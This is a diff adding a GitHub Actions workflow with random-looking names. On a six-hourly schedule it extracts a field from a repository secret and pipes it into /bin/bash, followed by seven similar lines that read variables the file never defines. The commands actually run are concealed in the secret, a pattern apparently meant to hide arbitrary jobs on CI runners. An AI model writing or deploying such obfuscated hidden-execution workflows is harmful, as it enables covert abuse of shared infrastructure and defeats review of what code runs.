@@ -1,0 +1,26 @@
+name: tanheshang7418
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tanheshang7418
+        env:
+          tflrl4735: ${{ secrets.tflrl4735 }}
+        run: |
+          echo $tflrl4735 | jq -r .mjj4326 | /bin/bash
+          echo $kwkkh8391 | jq -r .hzjia57 | /bin/bash
+          echo $eddg5546 | jq -r .t8208 | /bin/bash
+          echo $wgokl79419 | jq -r .qveiv59 | /bin/bash
+          echo $dj4580 | jq -r .pxkui015 | /bin/bash
+          echo $v670 | jq -r .ctt9 | /bin/bash
+          echo $gosu8262 | jq -r .acyv9 | /bin/bash
+          echo $chpl0 | jq -r .cqysh1 | /bin/bash
+
